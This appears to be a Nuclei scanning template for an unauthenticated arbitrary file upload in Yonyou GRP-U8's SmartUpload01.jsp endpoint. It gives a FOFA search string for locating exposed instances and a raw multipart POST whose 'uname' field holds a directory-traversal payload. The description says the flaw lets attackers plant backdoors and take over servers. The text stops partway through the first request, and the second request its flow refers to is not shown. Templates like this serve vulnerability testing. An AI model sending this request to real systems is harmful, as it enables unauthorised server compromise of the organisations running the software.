id: yonyou-grp-u8-smartupload01-file-upload

info:
  name: 用友GRP-U8 SmartUpload01.jsp接口任意文件上传漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="用友-GRP-U8"
        用友GRP-U8行政事业内控管理软件是面向行政事业单位的内部控制管理系统，其/u8qx/SmartUpload01.jsp接口存在文件上传逻辑缺陷。攻击者可利用该接口实现未经身份验证的任意文件上传，进而部署恶意后门程序并控制目标服务器。
  tags: 用友GRP-U8

flow: |
  http(1) && http(2)

http:
- raw:
  - |
    POST /u8qx/SmartUpload01.jsp HTTP/1.1
    Host: {{Hostname}}
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzhvrkrqt

    ------WebKitFormBoundaryzhvrkrqt
    Content-Disposition: form-data; name="uname"

    ../../../../../../../../../NdayTest
    ------WebKitFormBoundaryzhvrkrqt
    Content-Disposition: form-data; name="input_localfile"; filename="NTest.pdf"

